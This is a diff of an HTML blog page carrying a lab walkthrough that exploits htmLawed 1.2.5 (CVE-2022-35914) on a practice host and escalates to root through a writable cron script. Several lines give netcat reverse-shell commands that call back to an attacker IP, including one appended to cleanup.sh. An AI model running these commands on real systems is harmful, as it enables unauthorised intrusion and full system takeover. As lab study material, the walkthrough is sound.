@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="#\rDescription\rhtmLawed 1.2.5 on port 80 of this lab is vulnerable to Remote Code Execution (RCE). We can gain access to the Linux server as the user &lsquo;www-data&rsquo;. We have write access to a cleanup script, which is executed by root. We can use this to escalate our privileges. #\rSkills Learned\rCVE Exploitation GLPI htmlawed (CVE-2022-35914) Privilege Escalation via cronjob #\rSolution\r#\rFinding the vulnerability\rautorecon shows ports 22 and 80 are open.">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="#\rDescription\rhtmLawed 1.2.5 on port 80 of this lab is vulnerable to Remote Code Execution (RCE). We can gain access to the Linux server as the user &lsquo;www-data&rsquo;. We have write access to a cleanup script, which is executed by root. We can use this to escalate our privileges. #\rSkills Learned\rCVE exploitation GLPI htmlawed (CVE-2022-35914) Privilege escalation via cron job #\rSolution\r#\rFinding the vulnerability\rautorecon shows ports 22 and 80 are open.">
 <title>Law</title>
 
 <link rel='canonical' href='https://pho3nix-jacki3.github.io/p/law/'>
 
 <link rel="stylesheet" href="/scss/style.min.33b8a5c91ba8cfeb05ec46c3c5fdc518936151871fe775c2094cd25fd786d9e6.css"><meta property='og:title' content="Law">
-<meta property='og:description' content="#\rDescription\rhtmLawed 1.2.5 on port 80 of this lab is vulnerable to Remote Code Execution (RCE). We can gain access to the Linux server as the user &lsquo;www-data&rsquo;. We have write access to a cleanup script, which is executed by root. We can use this to escalate our privileges. #\rSkills Learned\rCVE Exploitation GLPI htmlawed (CVE-2022-35914) Privilege Escalation via cronjob #\rSolution\r#\rFinding the vulnerability\rautorecon shows ports 22 and 80 are open.">
+<meta property='og:description' content="#\rDescription\rhtmLawed 1.2.5 on port 80 of this lab is vulnerable to Remote Code Execution (RCE). We can gain access to the Linux server as the user &lsquo;www-data&rsquo;. We have write access to a cleanup script, which is executed by root. We can use this to escalate our privileges. #\rSkills Learned\rCVE exploitation GLPI htmlawed (CVE-2022-35914) Privilege escalation via cron job #\rSolution\r#\rFinding the vulnerability\rautorecon shows ports 22 and 80 are open.">
 <meta property='og:url' content='https://pho3nix-jacki3.github.io/p/law/'>
 <meta property='og:site_name' content='Blue Pho3nix'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Medium' /><meta property='article:tag' content='CVE-2022-35914' /><meta property='article:tag' content='cron job' /><meta property='article:published_time' content='2024-04-22T07:07:07&#43;01:00'/><meta property='article:modified_time' content='2024-04-22T07:07:07&#43;01:00'/><meta property='og:image' content='https://pho3nix-jacki3.github.io/categories/offsec/offsec-edit.png' />
 <meta name="twitter:title" content="Law">
-<meta name="twitter:description" content="#\rDescription\rhtmLawed 1.2.5 on port 80 of this lab is vulnerable to Remote Code Execution (RCE). We can gain access to the Linux server as the user &lsquo;www-data&rsquo;. We have write access to a cleanup script, which is executed by root. We can use this to escalate our privileges. #\rSkills Learned\rCVE Exploitation GLPI htmlawed (CVE-2022-35914) Privilege Escalation via cronjob #\rSolution\r#\rFinding the vulnerability\rautorecon shows ports 22 and 80 are open."><meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:description" content="#\rDescription\rhtmLawed 1.2.5 on port 80 of this lab is vulnerable to Remote Code Execution (RCE). We can gain access to the Linux server as the user &lsquo;www-data&rsquo;. We have write access to a cleanup script, which is executed by root. We can use this to escalate our privileges. #\rSkills Learned\rCVE exploitation GLPI htmlawed (CVE-2022-35914) Privilege escalation via cron job #\rSolution\r#\rFinding the vulnerability\rautorecon shows ports 22 and 80 are open."><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://pho3nix-jacki3.github.io/categories/offsec/offsec-edit.png' />
   
 
@@ -331,9 +331,9 @@
     <a href="#skills-learned" class="header-anchor">#</a>
     Skills Learned
 </h2><ul>
-<li>CVE Exploitation <a class="link" href="https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/"  target="_blank" rel="noopener"
+<li>CVE exploitation <a class="link" href="https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/"  target="_blank" rel="noopener"
     >GLPI htmlawed (CVE-2022-35914)</a></li>
-<li>Privilege Escalation via cronjob</li>
+<li>Privilege escalation via cron job</li>
 </ul>
 <h1 id="solution">
     <a href="#solution" class="header-anchor">#</a>
@@ -341,7 +341,9 @@
 </h1><h2 id="finding-the-vulnerability">
     <a href="#finding-the-vulnerability" class="header-anchor">#</a>
     Finding the vulnerability
-</h2><p><code>autorecon</code> shows ports 22 and 80 are open.</p>
+</h2><p><code>autorecon</code> shows ports 22 and 80 are open.
+<br><a class="link" href="https://www.youtube.com/watch?v=LkZetyoH2xc&amp;t=10s"  target="_blank" rel="noopener"
+    >Video timestamp 0:10</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -362,6 +364,7 @@
 		data-flex-basis="1077px"
 	
 ></p>
+<hr>
 <p>htmLawed 1.2.5 is running on port 80.</p>
 <p><img src="/p/law/3.png"
 	width="1509"
@@ -375,8 +378,9 @@
 		data-flex-basis="714px"
 	
 ></p>
-<p>Find the htmLawed version 1.2.5 <a class="link" href="https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/"  target="_blank" rel="noopener"
-    >GLPI htmlawed (CVE-2022-35914)</a> exploit.</p>
+<p>We find the htmLawed version 1.2.5 <a class="link" href="https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/"  target="_blank" rel="noopener"
+    >GLPI htmlawed (CVE-2022-35914)</a> exploit, but it fails. <br><a class="link" href="https://www.youtube.com/watch?v=LkZetyoH2xc&amp;t=61s"  target="_blank" rel="noopener"
+    >Video timestamp 1:01</a></p>
 <p>Expected outcome of exploit (see image below)</p>
 <p><img src="/p/law/4.png"
 	width="873"
@@ -403,10 +407,7 @@
 		data-flex-basis="899px"
 	
 ></p>
-<h2 id="foothold">
-    <a href="#foothold" class="header-anchor">#</a>
-    Foothold
-</h2><p>Run the exploit at http://192.168.195.190/vendor/htmlawed/htmlawed/htmLawedTest.php using <code>curl</code>. Still receive a 404 &ldquo;Not Found&rdquo; error.</p>
+<p>Run the exploit at http://192.168.195.190/vendor/htmlawed/htmlawed/htmLawedTest.php using <code>curl</code>. Still receive a 404 &ldquo;Not Found&rdquo; error.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -427,7 +428,14 @@
 		data-flex-basis="797px"
 	
 ></p>
-<p>Run the exploit at http://192.168.195.190 instead. The exploit works. We get remote code execution and read <code>/etc/passwd</code>.</p>
+<hr>
+<h2 id="foothold">
+    <a href="#foothold" class="header-anchor">#</a>
+    Foothold
+</h2><p>Run the exploit at http://192.168.195.190 instead, and it works.
+<br>We get remote code execution and read <code>/etc/passwd</code>.
+<br><a class="link" href="https://www.youtube.com/watch?v=LkZetyoH2xc&amp;t=145s"  target="_blank" rel="noopener"
+    >Video timestamp 2:25</a></p>
 <p><img src="/p/law/7.png"
 	width="1808"
 	height="694"
@@ -440,7 +448,9 @@
 		data-flex-basis="625px"
 	
 ></p>
-<p>Get a reverse shell as www-data using <code>nc -c bash 192.168.45.223 80</code> on the server and <code>nc -lvnp 80</code> on our attack machine.</p>
+<hr>
+<p>We get a reverse shell as www-data using <code>nc -c bash 192.168.45.223 80</code> on the server and <code>nc -lvnp 80</code> on our attack machine. <a class="link" href="https://www.youtube.com/watch?v=LkZetyoH2xc&amp;t=152s"  target="_blank" rel="noopener"
+    >Video timestamp 2:32</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -457,7 +467,10 @@
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvnp <span class="m">80</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Ugrade our shell with Python.</p>
+</div><hr>
+<p>Ugrade our shell with Python.
+<br><a class="link" href="https://www.youtube.com/watch?v=LkZetyoH2xc&amp;t=224s"  target="_blank" rel="noopener"
+    >Video timestamp 3:44</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -505,7 +518,10 @@
 		data-flex-basis="462px"
 	
 ></p>
-<p>Find <code>local.txt</code> in <code>/var/www/</code>.</p>
+<hr>
+<p>We find <code>local.txt</code> in <code>/var/www/</code>.
+<br><a class="link" href="https://www.youtube.com/watch?v=LkZetyoH2xc&amp;t=253s"  target="_blank" rel="noopener"
+    >Video timestamp 4:13</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -542,10 +558,13 @@
 		data-flex-basis="772px"
 	
 ></p>
+<hr>
 <h2 id="privilege-escalation">
     <a href="#privilege-escalation" class="header-anchor">#</a>
     Privilege Escalation
-</h2><p>Find a file named <code>cleanup.sh</code> in <code>/var/www/</code> we have write access to.</p>
+</h2><p>We have write access to the <code>cleanup.sh</code> script in <code>/var/www/</code>.
+<br><a class="link" href="https://www.youtube.com/watch?v=LkZetyoH2xc&amp;t=289s"  target="_blank" rel="noopener"
+    >Video timestamp 4:49</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -615,8 +634,11 @@
 		data-flex-basis="430px"
 	
 ></p>
+<hr>
 <p><a class="link" href="https://github.com/DominicBreuker/pspy"  target="_blank" rel="noopener"
-    >pspy</a> shows root running <code>cleanup.sh</code>.</p>
+    >pspy</a> shows root running <code>cleanup.sh</code>.
+<br><a class="link" href="https://www.youtube.com/watch?v=LkZetyoH2xc&amp;t=344s"  target="_blank" rel="noopener"
+    >Video timestamp 5:44</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -633,7 +655,22 @@
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod +x pspy64 <span class="o">&amp;&amp;</span> ./pspy64
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>We get a reverse shell as root by adding <code>nc -c bash 192.168.45.223 4444</code> to <code>cleanup.sh</code>. Then, we start a listener on our attack machine using the command <code>nc -lvnp 4444</code>. When the <code>cleanup.sh</code> file is executed as root, it triggers the <code>nc</code> command and connects to the specified IP address and port, thereby granting us access to a shell as root.</p>
+</div><p><img src="/p/law/13.png"
+	width="1756"
+	height="171"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1026"
+		data-flex-basis="2464px"
+	
+></p>
+<hr>
+<p>We get a reverse shell as root by adding <code>nc -c bash 192.168.45.223 4444</code> to <code>cleanup.sh</code>. Then, we start a listener on our attack machine using the command <code>nc -lvnp 4444</code>. When the <code>cleanup.sh</code> file is executed as root, it triggers the <code>nc</code> command and connects to the specified IP address and port, thereby granting us access to a shell as root.
+<br><a class="link" href="https://www.youtube.com/watch?v=LkZetyoH2xc&amp;t=401s"  target="_blank" rel="noopener"
+    >Video timestamp 6:41</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
